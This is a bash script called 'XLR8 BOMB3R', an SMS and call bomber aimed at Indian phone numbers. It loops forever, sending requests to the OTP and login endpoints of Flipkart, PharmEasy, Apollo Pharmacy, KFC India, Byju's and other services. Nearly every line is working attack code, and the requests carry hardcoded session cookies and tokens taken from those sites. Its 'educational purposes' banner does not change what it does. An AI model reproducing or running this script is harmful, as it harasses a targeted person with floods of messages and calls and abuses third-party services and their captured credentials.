#!/bin/bash
#Coded by Anubhav Kashyap
#Dont try to Steal it Bitch
clear
echo ""
echo ""
printf  "                \e[1;33m|C|O|N|N|E|C|T|I|N|G|"
echo ""
echo ""
echo ""
apt install figlet -y

banner() {

echo -e "\e[1;34m‎‎‏‏‎ ‎"
#After \e[1;34m a blank character is used to give purple colour to banner
figlet -c XLR8 BOMB3R
sleep 1
echo -e "                                         \e[91mAuthor:Anubhav Kashyap"
sleep 1
echo -e "                                         \e[36mGroup:Deepweb Shadows"
echo ""

}


menu(){
clear
banner
printf "\e[1;92m[\e[0m xlr8\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m\n"
read -p '---------------> ' num
printf "\n"
printf ">~~~>\e[1;92m Starting Attack On +91$num \e[0m<~~~<"
sleep 5
echo ""
echo ""
printf "\n"
printf "Press ctrl+c to quit ! \n"
sleep 3
opr
}

opr(){

while true
do
curl --http2 -X GET -H "Host:bcas-prod.byjusweb.com" -H "accept:*/*" -H "origin:https://byjus.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded" -H "referer:https://byjus.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" "https://bcas-prod.byjusweb.com/api/voice?phoneNumber=$num&page=free-trial-classes" > /dev/null 2>&1
curl --http2 -X POST -H "Host:api.doubtnut.com" -H "content-length:32" -H "origin:https://doubtnut.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded" -H "accept:*/*" -H "referer:https://doubtnut.com/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -d "phone_number=$num&is_web=3" "https://api.doubtnut.com/v4/student/login" > /dev/null 2>&1
curl -X POST -H "Host:1.rome.api.flipkart.com" -H "Connection:keep-alive" -H "Content-Length:277" -H "X-user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36FKUA/msite/0.0.3/msite/Mobile" -H "Origin:https://www.flipkart.com" -H "User-Agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "DNT:1" -H "Content-Type:application/json" -H "Accept:*/*" -H "Referer:https://www.flipkart.com/login?ret=%2F&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en,hi;q=0.9" -H "Cookie:T=BR%3Ackc00nj3s0ld44t1fl4viyrdi.1593405767800; vh=694; vw=393; dpr=2.75; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18582%7CMCMID%7C32386058512838181805251409547547818160%7CMCAID%7CNONE%7CMCOPTOUT-1605421510s%7CNONE%7CMCAAMLH-1605763174%7C12%7CMCAAMB-1606019110%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI; SN=VI878BDB5F1FB34EA4BDE5704AFD712FBC.TOK8930E6B228004CAA829EED793FFB23F0.1605440072.LO; S=d1t19IRc/Pz83Pz8/BD9QVG4/PzSRGfq27JDf/tHZThJ6S3EnNoejodwIWT7WkNwGUJTT73eVYm7i9S76Jw5HHKQ7dg==; gpv_pn=LOGIN_V4_MOBILE; gpv_pn_t=dynamic; s_sq=flipkart-mob-web%3D%2526pid%253DLOGIN_V4_MOBILE%2526pidt%253D1%2526oid%253Dfunctiongr%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT" -d '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"$num","clientQueryParamMap":{"ret":"/","entryPage":"HOMEPAGE_HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}' "https://1.rome.api.flipkart.com/1/action/view" > /dev/null 2>&1
curl --http2 -X GET -H "Host:www.smileyo.in" -H "accept:*/*" -H "dnt:1" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "referer:https://www.smileyo.in/my-account" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:ci_session=106acee7a72c96284b17c67857880be571aebe02" -H "cookie:_ga=GA1.1.97633685.1604654964" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_fbp=fb.1.1604654969572.2144587212" -H "cookie:_ga_NHZ9GNH3E2=GS1.1.1604654964.1.1.1604655005.0" "https://www.smileyo.in/Ajaxcontroller/send_otp?name=Jwjskwnsbsbs&mobile=$num&email=wyuwiswownn" > /dev/null 2>&1
curl --http2 -X POST -H "Host:bcas-prod.byjusweb.com" -H "content-length:46" -H "accept:*/*" -H "origin:https://byjus.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded" -H "referer:https://byjus.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -d "phoneNumber=$num&page=free-trial-classes" "https://bcas-prod.byjusweb.com/api/send-otp" > /dev/null 2>&1
curl --http2 -X GET -H "Host:bcas-prod.byjusweb.com" -H "accept:*/*" -H "origin:https://byjus.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded" -H "referer:https://byjus.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "if-none-match:W/"35-4XWAN6SOlwXqB4cG29ZwtC1e96w"" "https://bcas-prod.byjusweb.com/api/voice?phoneNumber=$num&page=free-trial-classes" > /dev/null 2>&1
curl -X POST -H "Host:pharmeasy.in" -H "content-length:30" -H "origin:https://pharmeasy.in" -H "x-real-ip:" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "x-ua:" -H "content-type:application/json" -H "x-phone-platform:mweb" -H "dnt:1" -H "x-ff:" -H "accept:*/*" -H "referer:https://pharmeasy.in/?src=sidebarmenu" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:pe_last_active=Mon%20Nov%2016%202020%2009:57:39%20GMT+0530%20(India%20Standard%20Time)" -H "cookie:WZRK_S_R9Z-WWR-854Z=%7B%22p%22%3A1%2C%22s%22%3A1605500826%2C%22t%22%3A1605500846%7D" -H "cookie:cto_bundle=fq8rEF9hJTJGNEl2dUw1eHdMMDZXbFJsOW95UmJ3MFIwY3pEWEFWbDVsbWtzT0JVTHFHandsNWlNeXpMNmcyS2VEQSUyQjNyMERqMmRDb2NkbEdjMXNKMlJ2SHhKREklMkZmaTBtU0dySEZvT04zckt6Tnk4dzlKcDJMcWpTVkthaHBJaEglMkJ0Qm8lMkZjMlNBbmtXdjVNRFdmcmgxeFlXM0F3JTNEJTNE" -H "cookie:tvc_supplier_city=Kolkata" -H "cookie:tvc_selected_city=Patna" -H "cookie:tvc_selected_city_type=non-courier" -H "cookie:_fbp=fb.1.1605500830364.1146206306" -H "cookie:_gat_UA-60621013-1=1" -H "cookie:_gac_UA-60621013-1=1.1605500829.Cj0KCQiAwMP9BRCzARIsAPWTJ_HLtn-e-e53GwKzUuN_7TIqQdYyQg0zhH6xQS3ivAyyngp3V0TGCwEaAnX8EALw_wcB" -H "cookie:XPESD={%22session_id%22:%22s_w_e28edd53a6fa4aa6bd29fc773dc2cb4b_1605500828000%22%2C%22session_id_flag%22:%22ct_id%22%2C%22media_source%22:%22google%22%2C%22gclid%22:%22Cj0KCQiAwMP9BRCzARIsAPWTJ_HLtn-e-e53GwKzUuN_7TIqQdYyQg0zhH6xQS3ivAyyngp3V0TGCwEaAnX8EALw_wcB%22%2C%22referrer%22:%22https://www.google.com/%22%2C%22session_start_time%22:%222020-11-16T04:27:08.897Z%22}" -H "cookie:XPESS=active" -H "cookie:WZRK_G=e28edd53a6fa4aa6bd29fc773dc2cb4b" -H "cookie:XdI=01913f296fdf72a239551f74a1be90c9" -H "cookie:_uetvid=fa3caba027c311eb819325b4e7e44306" -H "cookie:_uetsid=fa3beef027c311ebb1ecc72c48a20712" -H "cookie:_gid=GA1.2.1799023972.1605500823" -H "cookie:_ga=GA1.2.1390353714.1605500823" -H "cookie:pe_utm_data={%22%22:null%2C%22coupon%22:%22G18%22%2C%22ef_id%22:%22Cj0KCQiAwMP9BRCzARIsAPWTJ_HLtn-e-e53GwKzUuN_7TIqQdYyQg0zhH6xQS3ivAyyngp3V0TGCwEaAnX8EALw_wcB:G:s%22%2C%22gclid%22:%22Cj0KCQiAwMP9BRCzARIsAPWTJ_HLtn-e-e53GwKzUuN_7TIqQdYyQg0zhH6xQS3ivAyyngp3V0TGCwEaAnX8EALw_wcB%22%2C%22gclsrc%22:%22aw.ds%22%2C%22isSEM%22:%22true%22%2C%22subtitle%22:%22on%20your%20first%20medicine%20order%22%2C%22title%22:%22FLAT%2018%25%20OFF%22%2C%22utm_source%22:%22google%22}" -H "cookie:utmsourcesession=google" -H "cookie:_gcl_au=1.1.1389077382.1605500820" -H "cookie:_gcl_dc=GCL.1605500820.Cj0KCQiAwMP9BRCzARIsAPWTJ_HLtn-e-e53GwKzUuN_7TIqQdYyQg0zhH6xQS3ivAyyngp3V0TGCwEaAnX8EALw_wcB" -H "cookie:_gcl_aw=GCL.1605500820.Cj0KCQiAwMP9BRCzARIsAPWTJ_HLtn-e-e53GwKzUuN_7TIqQdYyQg0zhH6xQS3ivAyyngp3V0TGCwEaAnX8EALw_wcB" -H "cookie:X-WV=false" -H "cookie:X-Pincode=800020" -H "cookie:X-Default-City=861" -H "cookie:X-IP=157.42.212.217" -H "cookie:X-Phone-Platform=mweb" -H "cookie:X-App-Version=2.0" -H "cookie:pe_utm_source=google" -d '{"contactNumber":"$num"}' "https://pharmeasy.in/api/auth/requestOTP" > /dev/null 2>&1
curl -X POST -H "Host:www.apollopharmacy.in" -H "content-length:17" -H "accept:*/*" -H "origin:https://www.apollopharmacy.in" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.apollopharmacy.in/sociallogin/mobile/login/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:private_content_version=4cd4d5added916f85a1e6e3c9c8ec8cd" -H "cookie:AWSALBCORS=RVJmcjzId8h26egdM8gqE+zE8H0kVi/hX/zcdeVisCUbfqHSlZsYb6Rpp7nKQ4eYbo5NJ1J7xc82IvxYbaAE5OiDKcgrwfMHDNh13C4ppV4U1+zWJUx7YnVP5ny2" -H "cookie:AWSALB=RVJmcjzId8h26egdM8gqE+zE8H0kVi/hX/zcdeVisCUbfqHSlZsYb6Rpp7nKQ4eYbo5NJ1J7xc82IvxYbaAE5OiDKcgrwfMHDNh13C4ppV4U1+zWJUx7YnVP5ny2" -H "cookie:mage-messages=" -H "cookie:section_data_ids=%7B%22directory-data%22%3A1605458619%2C%22messages%22%3A1605458619%2C%22customer%22%3A1605458619%2C%22compare-products%22%3A1605458619%2C%22last-ordered-items%22%3A1605458619%2C%22cart%22%3A1605458620%2C%22cadence-fbpixel-fpc%22%3A1605458619%2C%22review%22%3A1605458619%2C%22ammessages%22%3A1605458619%2C%22wishlist%22%3A1605458619%2C%22paypal-billing-agreement%22%3A1605458619%7D" -H "cookie:mage-cache-sessid=true" -H "cookie:mage-cache-storage-section-invalidation=%7B%7D" -H "cookie:mage-cache-storage=%7B%7D" -H "cookie:__ta_ping=1" -H "cookie:__ta_visit=0krSpFgl1MTp1GecLutdkRJArbfttYaP" -H "cookie:__ta_device=oEx8FmdYUq8IUxEAlEnH1PCUkjDedzBv" -H "cookie:mage-translation-file-version=%7B%7D" -H "cookie:mage-translation-storage=%7B%7D" -H "cookie:_gat_UA-31142855-1=1" -H "cookie:_fbp=fb.1.1605458662028.1972732284" -H "cookie:_gat=1" -H "cookie:_gid=GA1.2.1683625971.1605458661" -H "cookie:_ga=GA1.2.849783532.1605458661" -H "cookie:PHPSESSID=mov35jlccgt32uhuu7dqbd31d1" -H "cookie:__cfduid=dca742260141ae747980b004a04f173281605458650" -d 'mobile=$num' "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/" > /dev/null 2>&1
curl -X POST -H "Host:online.kfc.co.in" -H "content-length:65" -H "accept:application/json, text/plain, */*" -H "origin:https://online.kfc.co.in" -H "__requestverificationtoken:_q1mRM97Ka-6h40Isu3sud5_HaGS0h3-HPPurayPvOvr9cFcOrWq24DUQKytTJok4iMrOqwL1Yw50hTly0qXh_W9rH4iLIpgtwj5e0CYwd01:wjR-nO_p7l9CO2OkkaYxsDLol-lyRTU1DYKE7HNrkmC7FDgRUqz7boyoLAdAzApIkjpQtkb1pNeuBo9J7UOe5EOkFiQWid_7EDjceC-LkEE1" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/json;charset=UTF-8" -H "referer:https://online.kfc.co.in/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:bm_sv=7E2F28ECBD1FA559C198042875ABD557~3wGOwHJ4BQR6LEMNl0DZpOwbu0vyEOTzd9uNwVVfuh6Xgekc93PVYMswnBMFYDAfzIbxmJXfJ2B78OCkGx7JXI2CDPPhPqsWkaXdTsuwmtrF+VIl0t0071bx6JZmKM+gkU8rnfXF6NUBc+6I9Qo12MY4Vuu98Pf532P/sTuqTpA=" -H "cookie:AWSALBCORS=DNMNy+J1MtnGfUgmXNxgdnz28RDFU6cp4L55aC/UbHjc1t46uvn9J0I5MlFv8pkKNeBJo/Pah50gLsjgDaydYt2EKfKeP4HJzhPb3AbjJ+fdzdwB/EdZ/nXuw/5D" -H "cookie:AWSALB=DNMNy+J1MtnGfUgmXNxgdnz28RDFU6cp4L55aC/UbHjc1t46uvn9J0I5MlFv8pkKNeBJo/Pah50gLsjgDaydYt2EKfKeP4HJzhPb3AbjJ+fdzdwB/EdZ/nXuw/5D" -H "cookie:cto_bundle=FA3p4l9iRW1qb0NPbDZGeWtGR1dGMklQUXBPT01BTVlBTDR2MzJ2V2ZCR0YlMkZNdnk2eEV4d3ZIQkZ6S1NkRVM1QlhPTEduSmZRJTJCekpxdWw3WFYlMkY2MmV3JTJCdmxTbWtPVnowdXF6UUN0bUdkMzMyJTJCMVFNMWQ0R2FzdU9PMldwU054eUxTY1BWRFlLOEpRM0x4YUxQZUJ5ZmdvT2FnJTNEJTNE" -H "cookie:_uetvid=d9e0cb70201d11ebbe22fb53b2866bf7" -H "cookie:_uetsid=70ea66f027c611eba0fc4f79c9283f1b" -H "cookie:_gat_UA-39424837-1=1" -H "cookie:ak_bmsc=D5FA06F38F522A8EB006F8C6CFA79069312C8DBE8D340000B803B25F4909084B~pljObhbZvupWHGgEdD9wfy9q4b/MwAhtBiia2BhIc8aZUCKS+/9s3QsdkROi2diZFnsVvIPfn0eihAC4yHieoosUQnbfx9nS1bQGDbXNRbo5mGKI+Bae2SVns3bSdy6WLurU645ypwmZdlpCLHL1MZJzZV0mZxHjUlmGvcjPpBSDy0QRUY7XiC7EDguCnT37yTbnhtcoTyp7MO3UmDp+XQ4S+ne3yuWsKDHeVEHTMGuqEyVgAAvmFl9Z9iM12iwe9722jddQwmyxUXtLqfRIT37g==" -H "cookie:_gid=GA1.3.705270449.1605501882" -H "cookie:bm_mi=D51D23E9F0B0F1641B04F4025C20720C~H/4rvKNXh3VBwpITpE/KStr8a7eGZwIqdn3T/TU3ZLtrsIFq6RO5XduK0qsXE9bnM+dHnGAYOnXoQcHmqvmvUT0BbK7H+W+Oda2nHJINoZzo599LphgKRhAlmk9CVI54SCljTwh1ETbMyQnJCuYbS9hQzHy2vnWR0n+VpkAmbEkPqX5OlyXV4EXz8hvIzVsFfR8yjl4Ua0dFwFJbplJZPwGdFhe6WPKtNQ9aTPdUA68KFIewkuvTUyqETEEzgKcaE6eZsUX+Mm0SzfVSm2qGNtZN/CG/RgiAp08C8e6OgVM=" -H "cookie:KFCI.A.SID_o=bd4yk0hjemph4hq0llztc31p" -H "cookie:KFCI.A.SID=bd4yk0hjemph4hq0llztc31p" -H "cookie:_fbp=fb.2.1604659815855.1152374679" -H "cookie:_ga=GA1.3.1540186003.1604659815" -H "cookie:_gcl_au=1.1.1299320740.1604659814" -H "cookie:KFCI.IMS=False" -H "cookie:KFCI.LC=en-US" -H "cookie:KFCI.ReMe=False" -H "cookie:KFCI.CHNL=All" -H "cookie:KFCI.IPO=False" -H "cookie:KFCI.ASD=False" -H "cookie:KFCI.OM=None" -d '{"phoneNumber":"$num","AuthorizedFor":"3","Resend":"false"}' "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1605501909439" > /dev/null 2>&1
curl --http2 -X GET -H "Host:m.netmeds.com" -H "accept:application/json, text/plain, */*" -H "dnt:1" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "referer:https://m.netmeds.com/customer/account/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:_gcl_au=1.1.1622875400.1605252639" -H "cookie:_ALGOLIA=anonymous-408779d3-086b-43f1-bdc8-e3593c16ace4" -H "cookie:_ga=GA1.2.1678001414.1605252641" -H "cookie:_gid=GA1.2.735651441.1605252641" -H "cookie:_ga=GA1.3.1678001414.1605252641" -H "cookie:_gid=GA1.3.735651441.1605252641" -H "cookie:bsUl=0" -H "cookie:_gat_UA-63910444-1=1" -H "cookie:_fbp=fb.1.1605252643309.1794174605" -H "cookie:_gat=1" -H "cookie:bsCoId=3605252647100" -H "cookie:G_ENABLED_IDPS=google" "https://m.netmeds.com/mst/rest/v1/id/details/$num" > /dev/null 2>&1
curl --http2 -X POST -H "Host:www.extramarks.com" -H "content-length:104" -H "accept:application/json, text/javascript, */*; q=0.01" -H "origin:https://www.extramarks.com" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.extramarks.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:PHPSESSID=6s37n6hk7qp7b3075930n3hkj1" -H "cookie:_fbp=fb.1.1605168090001.1471940270" -H "cookie:_gcl_au=1.1.1103104302.1605168098" -H "cookie:_ga=GA1.2.612359166.1605168098" -H "cookie:_gid=GA1.2.1103406784.1605168098" -d "user_mobile=$num&otp_type=send_otp_reg&mobile_code=%2B91&display_name=Jsjsosks+jdidosbsh&email_id=" "https://www.extramarks.com/user/otpverification/$num" > /dev/null 2>&1
curl --http2 -X POST -H "Host:grofers.com" -H "content-length:21" -H "lon:77.040489" -H "device_id:eca1f974-9468-4a0d-9a3f-cf389847a11a" -H "origin:https://grofers.com" -H "auth_key:e8d5c291c3416319fd2b053ecc0ee79af838a0f756c66102d9423f106adf2020" -H "content-type:application/x-www-form-urlencoded" -H "app_client:consumer_web" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36" -H "lat:28.4465616" -H "save-data:on" -H "accept:*/*" -H "referer:https://grofers.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-GB,en;q=0.9,en-US;q=0.8,hi;q=0.7,nl;q=0.6" -H "cookie:__cfduid=d62ea9fb03327dcae3aa1cba67e0f91301604675192" -H "cookie:gr_1_deviceId=eca1f974-9468-4a0d-9a3f-cf389847a11a" -H "cookie:city=" -H "cookie:gr_1_lat=28.4640810758775" -H "cookie:gr_1_lon=76.9942133969929" -H "cookie:gr_1_locality=1849" -H "cookie:rl_anonymous_id=%22ab624d9b-e087-411f-a8bf-f08581546149%22" -H "cookie:rl_user_id=%22%22" -H "cookie:ajs_anonymous_id=%22ce3b5e10-7c3b-4610-8303-d500457cb41e%22" -H "cookie:_gcl_au=1.1.1929301394.1604675198" -H "cookie:_uetsid=ac907fd0204111eb9262e7d445132e1e" -H "cookie:_uetvid=ac91bbd0204111ebaafb6796af997a23" -H "cookie:_ga=GA1.2.130807837.1604675201" -H "cookie:_gid=GA1.2.64916838.1604675201" -H "cookie:_gat_UA-85989319-1=1" -H "cookie:_sp_ses.bf41=*" -H "cookie:_sp_id.bf41=4dc20d20fcb0652e.1604675201.1.1604675201.1604675201.034e7d91-2e1c-4eb7-b45b-f7c9b2ee0f66" -H "cookie:WZRK_G=868a56a537564440994a9066a4c0e429" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:__insp_wid=180455199" -H "cookie:__insp_slim=1604675203427" -H "cookie:__insp_nv=true" -H "cookie:__insp_targlpu=aHR0cHM6Ly9ncm9mZXJzLmNvbS8%3D" -H "cookie:__insp_targlpt=T25saW5lIEdyb2NlcnkgU3RvcmU6IEJ1eSBPbmxpbmUgR3JvY2VyeSBmcm9tIEluZGlhJ3MgQmVzdCBPbmxpbmUgU3VwZXJtYXJrZXQgYXQgRGlzY291bnRlZCBSYXRlcyB8IEdyb2ZlcnM%3D" -H "cookie:_fbp=fb.1.1604675203579.255825096" -H "cookie:_hjid=fb662ad7-5b30-445d-899b-7e9b250c4117" -H "cookie:_hjFirstSeen=1" -H "cookie:_hjAbsoluteSessionInProgress=0" -H "cookie:__insp_norec_sess=true" -H "cookie:WZRK_S_RKR-99Z-ZK5Z=%7B%22p%22%3A1%2C%22s%22%3A1604675204%2C%22t%22%3A1604675211%7D" -H "cookie:__cfruid=0f71c77563be257eb5ad6aa54858ad4eb0b62ae4-1604675224" -d "user_phone=$num" "https://grofers.com/v2/accounts/" > /dev/null 2>&1
curl --http2 -X GET -H "Host:bcas-prod.byjusweb.com" -H "accept:*/*" -H "origin:https://byjus.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded" -H "referer:https://byjus.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" "https://bcas-prod.byjusweb.com/api/voice?phoneNumber=$num&page=free-trial-classes" > /dev/null 2>&1
done

}


menux() {

clear
apt install curl
clear
banner
sleep 1
date
echo "------------------------------"
printf "\e[1;33mThis tool is only for Educational Purposes !!\e[0m"
echo ""
echo "------------------------------"
echo -e "\e[34mThis Bomber Only Works In India :)"
echo "------------------------------"
echo ""
sleep 1
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;93m ATTACK ON NUMBER \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;93m UPDATE \e[0m\n"
printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;93m QUIT \e[0m\n"
printf "\n"
read -p 'Select Option !! >>> ' options

if [ "$options" -eq "1" ];then
        menu
fi
if [ "$options" -eq "2" ];then
clear
apt install git -y
clear
figlet -c Updating Script !
echo ""
echo ""
echo -e "\e[1;34m Requesting Update From Source..."
echo -e "\e[1;34m Request Attempt Successful.."
echo -e "\e[1;34m Updating Now..."
sleep 4
cd ..
rm -rf XLR8_BOMB3R
git clone https://github.com/anubhavanonymous/XLR8_BOMB3R
cd XLR8_BOMB3R
chmod +x xlr8.sh
figlet -c Script Updated !
sleep 2
bash xlr8.sh


fi

if [ "$options" -eq "3" ];then
        exit
        exit
        exit
else
        menux
fi


}

menux
